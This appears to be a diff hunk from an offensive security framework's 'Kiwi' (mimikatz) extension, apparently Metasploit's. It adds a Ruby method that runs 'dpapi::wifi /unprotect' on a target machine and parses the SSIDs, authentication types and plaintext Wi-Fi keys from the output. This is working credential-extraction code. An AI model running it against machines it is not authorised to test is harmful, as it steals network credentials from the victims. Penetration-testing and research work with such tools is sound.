@@ -380,6 +380,57 @@ class Kiwi < Extension
   end
 
   #
+  # Access and parse a set of wifi profiles using the given interfaces
+  # list, which contains the list of profile xml files on the target.
+  #
+  # @return [Hash]
+  def wifi_parse_shared(wifi_interfaces)
+    results = []
+
+    exec_cmd('"base64 /in:off /out:on"')
+    wifi_interfaces.keys.each do |key|
+      interface = {
+        :guid     => key,
+        :desc     => nil,
+        :state    => nil,
+        :profiles => []
+      }
+
+      wifi_interfaces[key].each do |wifi_profile_path|
+        cmd = "\"dpapi::wifi /in:#{wifi_profile_path} /unprotect\""
+        output = exec_cmd(cmd)
+
+        lines = output.lines
+
+        profile = {
+          :name        => nil,
+          :auth        => nil,
+          :key_type    => nil,
+          :shared_key  => nil
+        }
+
+        while lines.length > 0 do
+          line = lines.shift.strip
+          if line =~ /^\* SSID name\s*: (.*)$/
+            profile[:name] = $1
+          elsif line =~ /^\* Authentication\s*: (.*)$/
+            profile[:auth] = $1
+          elsif line =~ /^\* Key Material\s*: (.*)$/
+            profile[:shared_key] = $1
+          end
+        end
+
+        interface[:profiles] << profile
+      end
+
+      results << interface
+    end
+    exec_cmd('"base64 /in:on /out:on"')
+
+    results
+  end
+
+  #
   # List all the wifi interfaces and the profiles associated
   # with them. Also show the raw text passwords for each.
   #
